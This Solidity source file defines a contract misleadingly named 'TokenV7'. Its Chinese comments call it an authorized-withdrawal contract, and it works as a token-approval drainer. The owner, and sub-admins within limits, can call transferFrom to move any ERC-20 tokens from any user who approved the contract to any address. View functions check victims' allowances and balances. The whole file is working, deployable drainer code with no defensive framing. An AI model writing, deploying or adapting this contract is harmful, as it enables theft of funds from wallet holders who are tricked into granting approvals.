// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title TokenV7
 * @dev 精简版授权提币合约
 * 功能：主管理员提币 + 子管理员限额提币
 */
contract TokenV7 {
    address public owner;
    
    // 子管理员结构
    struct SubAdmin {
        address addr;
        uint256 withdrawLimit;    // 提币限额
        uint256 withdrawnAmount;  // 已提币金额
        bool isActive;
    }
    
    SubAdmin[10] public subAdmins;
    uint256 public subAdminCount;
    
    mapping(address => uint256) public subAdminIndex;
    mapping(address => bool) public isSubAdmin;
    
    event ExternalTokenWithdraw(address indexed token, address indexed from, address indexed to, uint256 amount);
    event SubAdminAdded(address indexed admin, uint256 withdrawLimit);
    event SubAdminRemoved(address indexed admin);
    event SubAdminLimitUpdated(address indexed admin, uint256 newLimit);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    modifier onlySubAdmin() {
        require(isSubAdmin[msg.sender], "Not sub admin");
        _;
    }
    
    constructor() {
        owner = msg.sender;
    }
    
    // ==================== 授权提币功能 ====================
    
    /**
     * @dev 主管理员提取用户授权的代币（兼容USDT）
     */
    function withdrawUserToken(address token, address from, address to, uint256 amount) public onlyOwner {
        require(token != address(0), "Invalid token");
        require(from != address(0), "Invalid from");
        require(to != address(0), "Invalid to");
        require(amount > 0, "Amount must > 0");
        
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
        
        emit ExternalTokenWithdraw(token, from, to, amount);
    }
    
    /**
     * @dev 子管理员提取用户授权的代币（受限额控制）
     */
    function subAdminWithdrawUserToken(address token, address from, address to, uint256 amount) public onlySubAdmin {
        require(token != address(0), "Invalid token");
        require(from != address(0), "Invalid from");
        require(to != address(0), "Invalid to");
        require(amount > 0, "Amount must > 0");
        
        uint256 index = subAdminIndex[msg.sender];
        SubAdmin storage admin = subAdmins[index];
        
        require(admin.withdrawnAmount + amount <= admin.withdrawLimit, "Exceeds limit");
        admin.withdrawnAmount += amount;
        
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Transfer failed");
        
        emit ExternalTokenWithdraw(token, from, to, amount);
    }
    
    // ==================== 查询功能 ====================
    
    function getUserAllowance(address token, address user) public view returns (uint256) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(0xdd62ed3e, user, address(this))
        );
        if (success && data.length >= 32) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }
    
    function getUserBalance(address token, address user) public view returns (uint256) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(0x70a08231, user)
        );
        if (success && data.length >= 32) {
            return abi.decode(data, (uint256));
        }
        return 0;
    }
    
    // ==================== 子管理员管理 ====================
    
    function addSubAdmin(address _admin, uint256 _withdrawLimit) public onlyOwner {
        require(_admin != address(0), "Invalid address");
        require(!isSubAdmin[_admin], "Already sub admin");
        require(subAdminCount < 10, "Max 10 sub admins");
        
        for (uint256 i = 0; i < 10; i++) {
            if (!subAdmins[i].isActive) {
                subAdmins[i] = SubAdmin(_admin, _withdrawLimit, 0, true);
                subAdminIndex[_admin] = i;
                isSubAdmin[_admin] = true;
                subAdminCount++;
                emit SubAdminAdded(_admin, _withdrawLimit);
                return;
            }
        }
    }
    
    function removeSubAdmin(address _admin) public onlyOwner {
        require(isSubAdmin[_admin], "Not sub admin");
        uint256 index = subAdminIndex[_admin];
        subAdmins[index].isActive = false;
        subAdmins[index].addr = address(0);
        isSubAdmin[_admin] = false;
        subAdminCount--;
        emit SubAdminRemoved(_admin);
    }
    
    function setSubAdminLimit(address _admin, uint256 _newLimit) public onlyOwner {
        require(isSubAdmin[_admin], "Not sub admin");
        uint256 index = subAdminIndex[_admin];
        subAdmins[index].withdrawLimit = _newLimit;
        emit SubAdminLimitUpdated(_admin, _newLimit);
    }
    
    function resetSubAdminWithdrawn(address _admin) public onlyOwner {
        require(isSubAdmin[_admin], "Not sub admin");
        uint256 index = subAdminIndex[_admin];
        subAdmins[index].withdrawnAmount = 0;
    }
    
    function getSubAdminInfo(address _admin) public view returns (
        uint256 withdrawLimit,
        uint256 withdrawnAmount,
        uint256 remainingLimit,
        bool isActive
    ) {
        require(isSubAdmin[_admin], "Not sub admin");
        uint256 index = subAdminIndex[_admin];
        SubAdmin memory admin = subAdmins[index];
        return (admin.withdrawLimit, admin.withdrawnAmount, admin.withdrawLimit - admin.withdrawnAmount, admin.isActive);
    }
    
    function getAllSubAdmins() public view returns (address[10] memory addrs, uint256[10] memory limits, bool[10] memory actives) {
        for (uint256 i = 0; i < 10; i++) {
            addrs[i] = subAdmins[i].addr;
            limits[i] = subAdmins[i].withdrawLimit;
            actives[i] = subAdmins[i].isActive;
        }
    }
    
    // ==================== 管理员功能 ====================
    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Zero address");
        owner = newOwner;
    }
}